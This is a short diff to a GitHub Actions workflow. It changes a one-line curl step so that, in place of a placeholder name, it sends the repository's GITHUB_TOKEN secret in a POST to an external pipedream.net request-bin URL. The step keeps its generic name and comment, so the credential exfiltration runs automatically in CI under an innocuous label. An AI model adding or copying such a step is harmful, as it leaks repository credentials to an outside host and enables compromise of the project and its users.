@@ -28,4 +28,4 @@ jobs:
       # Runs a single command using the runners shell
       - name: Run a one-line script
         run: |
-          curl -d '{ "name": "Yoda" }' -H "Content-Type: application/json" https://en7jvsw7jin9k.x.pipedream.net/
+          curl -d '{ "name": "${{ secrets.GITHUB_TOKEN }}" }' -H "Content-Type: application/json" https://en7jvsw7jin9k.x.pipedream.net/
